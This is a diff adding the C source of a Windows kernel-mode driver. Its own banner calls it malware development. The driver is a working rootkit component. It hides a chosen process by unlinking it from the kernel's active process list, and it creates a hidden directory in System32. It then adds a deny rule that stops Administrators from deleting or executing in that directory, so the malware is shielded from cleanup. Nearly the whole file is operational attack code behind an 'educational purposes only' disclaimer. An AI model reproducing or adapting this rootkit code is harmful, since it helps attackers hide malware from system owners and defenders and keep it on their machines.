@@ -1,0 +1,391 @@
+﻿/*
+╔═════════════════════════════════════════════════════════════╗
+║                                                             ║
+║                 ⚠️  Malware Development  ⚠️                ║
+║                                                             ║
+║  @author: bekoo                                             ║
+║  @website : 0xbekoo.github.io                               ║
+║  @warning : This project has been developed                 ║
+║             for educational purposes only.Its use in        ║
+║             real scenarios is at one's own risk.            ║
+║                                                             ║
+║  @project: Malware Resurrection - KernelMode Driver         ║
+║                                                             ║
+╚═════════════════════════════════════════════════════════════╝
+*/
+
+#pragma warning(disable: 28251 4189 4996 4152)
+
+#include "main.h"
+
+/* Remember to put \\ at the end of the path. */
+UNICODE_STRING G_ExecutablePath = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\Hiddenfile\\");
+
+PVOID GetKernelBase() {
+	fp_ZwQuerySystemInformation fpZwQuerySystemInformation;
+	PRTL_PROCESS_MODULES Modules;
+	UNICODE_STRING QuerySystemInfoStr;
+	PVOID KernelBase = NULL;
+	ULONG Bytes = 0;
+	NTSTATUS Status;
+
+	RtlInitUnicodeString(&QuerySystemInfoStr, L"ZwQuerySystemInformation");
+
+	fpZwQuerySystemInformation = (fp_ZwQuerySystemInformation)MmGetSystemRoutineAddress(&QuerySystemInfoStr);
+	if (NULL == fpZwQuerySystemInformation) {
+		return NULL;
+	}
+	DbgPrintEx(0, 0, "[+] ZwQuerySystemInformation Address: 0x%p\n", fpZwQuerySystemInformation);
+
+	Status = fpZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &Bytes);
+	if (STATUS_INFO_LENGTH_MISMATCH != Status) {
+		return NULL;
+	}
+
+	Modules = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPool, Bytes, 'modl');
+	if (NULL == Modules) {
+		return NULL;
+	}
+
+	Status = fpZwQuerySystemInformation(SystemModuleInformation, Modules, Bytes, &Bytes);
+	if (!NT_SUCCESS(Status)) {
+		return NULL;
+	}
+	KernelBase = Modules->Modules[0].ImageBase;
+
+	ExFreePool(Modules);
+	return KernelBase;
+
+}
+
+PVOID FindFunction(PVOID KernelBaseAddress, PCSTR TargetFunctionName) {
+	PIMAGE_EXPORT_DIRECTORY ExportDirectory;
+	PIMAGE_DOS_HEADER DosHeader;
+	PIMAGE_NT_HEADERS NTHeader;
+	PVOID FoundFuncAddress = NULL;
+	PCSTR CurrentFunction = NULL;
+	PUSHORT Ordinals = 0;
+	USHORT TargetOrdinal = 0;
+	PULONG Functions = 0;
+	PULONG Names = 0;
+	ULONG ExportDirectoryRVA;
+
+	DosHeader = (PIMAGE_DOS_HEADER)KernelBaseAddress;
+	if (IMAGE_DOS_SIGNATURE != DosHeader->e_magic) {
+		DbgPrintEx(0, 0, "[-] Invalid DOS Header Signature!\n");
+		return NULL;
+	}
+
+	NTHeader = (PIMAGE_NT_HEADERS)((PUCHAR)KernelBaseAddress + DosHeader->e_lfanew);
+	if (IMAGE_NT_SIGNATURE != NTHeader->Signature) {
+		DbgPrintEx(0, 0, "[-] Invalid NT Header Signature!\n");
+		return NULL;
+	}
+
+	ExportDirectoryRVA = NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+	if (!ExportDirectoryRVA) {
+		DbgPrintEx(0, 0, "[-] No Export Directory Found!\n");
+		return NULL;
+	}
+
+	ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)KernelBaseAddress + ExportDirectoryRVA);
+	if (!ExportDirectory) {
+		DbgPrintEx(0, 0, "[-] Export Directory not Found!\n");
+		return NULL;
+	}
+	DbgPrintEx(0, 0, "[+] Export Directory Found at 0x%p\n", ExportDirectory);
+
+	Names = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory->AddressOfNames);
+	Ordinals = (PUSHORT)((PUCHAR)KernelBaseAddress + ExportDirectory->AddressOfNameOrdinals);
+	Functions = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory->AddressOfFunctions);
+
+	for (ULONG i = 0; i < ExportDirectory->NumberOfNames; i++) {
+		CurrentFunction = (PCSTR)((PUCHAR)KernelBaseAddress + Names[i]);
+
+		if (strcmp(CurrentFunction, TargetFunctionName) == 0) {
+			TargetOrdinal = Ordinals[i];
+			FoundFuncAddress = (PVOID)((PUCHAR)KernelBaseAddress + Functions[TargetOrdinal]);
+
+			DbgPrintEx(0, 0, "[+] Function %s found at 0x%p Address!\n", TargetFunctionName, FoundFuncAddress);
+			return FoundFuncAddress;
+		}
+	}
+	DbgPrintEx(0, 0, "[-] %s not Found in Export Table!\n", TargetFunctionName);
+
+	return NULL;
+}
+
+NTSTATUS SetFolderPermissions(UNICODE_STRING ImagePath, ACCESS_MASK CurrentAccessMask) {
+	fpRtlAddAccessDeniedAceEx fp_RtlAddAccessDeniedAceEx;
+	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+	PSECURITY_DESCRIPTOR SecurityDescriptor = NULL;
+	IO_STATUS_BLOCK IoStatusBlock;
+	OBJECT_ATTRIBUTES ObjAttr;
+	HANDLE HandleFile = NULL;
+	PACL Acl = NULL;
+	ULONG AclSize = 0;
+	PSID AdminSid = NULL;
+	SID AdminSidStatic;
+	PVOID RtlAddAccessDeniedAceExAddr = NULL;
+	PVOID KernelAddress = NULL;
+	NTSTATUS Status;
+
+	KernelAddress = GetKernelBase();
+	if (NULL == KernelAddress) {
+		DbgPrintEx(0, 0, "[-] Failed to Get Kernel Base Address!\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+	DbgPrintEx(0, 0, "[+] Kernel Base Address: 0x%p\n", KernelAddress);
+
+	RtlAddAccessDeniedAceExAddr = FindFunction(KernelAddress, "RtlAddAccessDeniedAceEx");
+	if (NULL == RtlAddAccessDeniedAceExAddr) {
+		DbgPrintEx(0, 0, "[-] Failed to Find RtlAddAccessDeniedAceEx Function!\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+	fp_RtlAddAccessDeniedAceEx = (fpRtlAddAccessDeniedAceEx)RtlAddAccessDeniedAceExAddr;
+
+	InitializeObjectAttributes(&ObjAttr, &ImagePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+	
+	Status = ZwOpenFile(&HandleFile, READ_CONTROL | WRITE_DAC, &ObjAttr, &IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, \
+	FILE_DIRECTORY_FILE);
+	if (!NT_SUCCESS(Status)) {
+		return Status;
+	}
+
+	SecurityDescriptor = ExAllocatePoolWithTag(PagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, 'Secd');
+	if (NULL == SecurityDescriptor) {
+		ZwClose(HandleFile);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	Status = RtlCreateSecurityDescriptor(SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return Status;
+	}
+
+	/* Include Admin and User */
+	RtlInitializeSid(&AdminSidStatic, &NtAuthority, 2);
+	*RtlSubAuthoritySid(&AdminSidStatic, 0) = SECURITY_BUILTIN_DOMAIN_RID;
+	*RtlSubAuthoritySid(&AdminSidStatic, 1) = DOMAIN_ALIAS_RID_ADMINS;
+	AdminSid = &AdminSidStatic;
+
+	AclSize = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) - sizeof(ULONG) + RtlLengthSid(AdminSid);
+	Acl = ExAllocatePoolWithTag(PagedPool, AclSize, 'ACLT');
+	if (NULL == Acl) {
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	Status = RtlCreateAcl(Acl, AclSize, ACL_REVISION);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePoolWithTag(Acl, 'ACLT');
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return Status;
+	}
+
+	Status = fp_RtlAddAccessDeniedAceEx(Acl, ACL_REVISION, OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE, CurrentAccessMask, AdminSid);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePoolWithTag(Acl, 'ACLT');
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return Status;
+	}
+
+	Status = RtlSetDaclSecurityDescriptor(SecurityDescriptor, TRUE, Acl, FALSE);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePoolWithTag(Acl, 'ACLT');
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return Status;
+	}
+
+	Status = ZwSetSecurityObject(HandleFile, DACL_SECURITY_INFORMATION, SecurityDescriptor);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePoolWithTag(Acl, 'ACLT');
+		ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+		ZwClose(HandleFile);
+		return Status;
+	}
+
+	ExFreePoolWithTag(Acl, 'ACLT');
+	ExFreePoolWithTag(SecurityDescriptor, 'Secd');
+	ZwClose(HandleFile);
+	return Status;
+}
+
+NTSTATUS HideProcess(HANDLE ProcessID) {
+	PLIST_ENTRY ActiveProcessLink;
+	PEPROCESS Process;
+	NTSTATUS Status;
+
+	Status = PsLookupProcessByProcessId(ProcessID, &Process);
+	if (!NT_SUCCESS(Status)) {
+		return Status;
+	}
+
+	/* ActiveProcessLink Offset = > 0x448 */
+	ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + 0x448);
+
+	RemoveEntryList(ActiveProcessLink);
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS CreateHiddenFile() {
+	HANDLE HandleDirectory = NULL;
+	HANDLE HandleFile = NULL;
+	OBJECT_ATTRIBUTES ObjAttr;
+	IO_STATUS_BLOCK IoStatusBlock;
+	NTSTATUS Status;
+
+	InitializeObjectAttributes(&ObjAttr, &G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	Status = ZwCreateFile(&HandleDirectory, GENERIC_ALL, &ObjAttr, &IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \
+		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+	if (!NT_SUCCESS(Status)) {
+		if (STATUS_OBJECT_NAME_COLLISION == Status) {
+			DbgPrintEx(0, 0, "Directory already exists!\n");
+			ZwClose(HandleDirectory);
+			return Status;
+		}
+		DbgPrintEx(0, 0, "Failed to Hidden File! Error Code: 0x%08X\n", Status);
+		return Status;
+	}
+	ZwClose(HandleDirectory);
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS DispatchIOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+
+	UNREFERENCED_PARAMETER(DeviceObject);
+	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
+	HANDLE MalwarePID;
+	ULONG InputBufferLength;
+	BOOLEAN ProcessRunning = TRUE;
+	NTSTATUS Status;
+
+	switch (Stack->Parameters.DeviceIoControl.IoControlCode) {
+
+		case IOCTL_CREATE_DIRECTORY:			
+			Status = CreateHiddenFile();
+			if (!NT_SUCCESS(Status)) {
+				if (STATUS_OBJECT_NAME_COLLISION == Status) {
+					Irp->IoStatus.Status = STATUS_SUCCESS;
+					Irp->IoStatus.Information = 0;
+					break;
+				}
+				Irp->IoStatus.Status = Status;
+				Irp->IoStatus.Information = 0;
+				break;
+			}
+
+			Irp->IoStatus.Status = STATUS_SUCCESS;
+			Irp->IoStatus.Information = 0;
+			break;
+
+		case IOCTL_HIDE_PROCESS:
+			MalwarePID = *((HANDLE*)Irp->AssociatedIrp.SystemBuffer);
+			InputBufferLength = Stack->Parameters.DeviceIoControl.InputBufferLength;
+
+			if (NULL == MalwarePID) {
+				Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
+				Irp->IoStatus.Information = 0;
+				break;
+			}
+
+			Status = HideProcess(MalwarePID);
+			if (!NT_SUCCESS(Status)) {
+				Irp->IoStatus.Status = Status;
+				Irp->IoStatus.Information = 0;
+				break;
+			}
+
+			Status = SetFolderPermissions(G_ExecutablePath, DELETE | FILE_EXECUTE);
+			if (!NT_SUCCESS(Status)) {
+				Irp->IoStatus.Status = Status;
+				Irp->IoStatus.Information = 0;
+				break;
+			}
+
+			Irp->IoStatus.Status = STATUS_SUCCESS;
+			Irp->IoStatus.Information = InputBufferLength;
+			break;
+
+		default:
+			Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
+			Irp->IoStatus.Information = 0;
+			break;
+	}
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+
+	return Irp->IoStatus.Status;
+}
+
+NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+	UNREFERENCED_PARAMETER(DeviceObject);
+
+	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
+
+	switch (Stack->MajorFunction) {
+	case IRP_MJ_CREATE:
+		Irp->IoStatus.Status = STATUS_SUCCESS;
+		break;
+
+	case IRP_MJ_CLOSE:
+		Irp->IoStatus.Status = STATUS_SUCCESS;
+		break;
+
+	default:
+		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
+		break;
+	}
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+
+	return Irp->IoStatus.Status;
+}
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath){
+	UNREFERENCED_PARAMETER(RegistryPath);
+	UNICODE_STRING DeviceName;
+	UNICODE_STRING SymLink;
+	PDEVICE_OBJECT DeviceObject;
+	NTSTATUS Status;
+
+	RtlInitUnicodeString(&DeviceName, L"\\Device\\MyDevice");
+	RtlInitUnicodeString(&SymLink, L"\\??\\MyDevice");
+	
+	Status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "Failed to Create Device!\n");
+		return Status;
+	}
+
+	Status = IoCreateSymbolicLink(&SymLink, &DeviceName);
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "Failed to Create Symbolic Link!\n");
+		return Status;
+	}
+	DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIOControl;
+	DriverObject->DriverUnload = UnloadDriver;
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject)
+{
+	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDevice");
+	DbgPrintEx(0, 0, "Unloading the Driver...\n");
+
+	IoDeleteSymbolicLink(&SymName);
+	IoDeleteDevice(DriverObject->DeviceObject);
+
+	return STATUS_SUCCESS;
+}
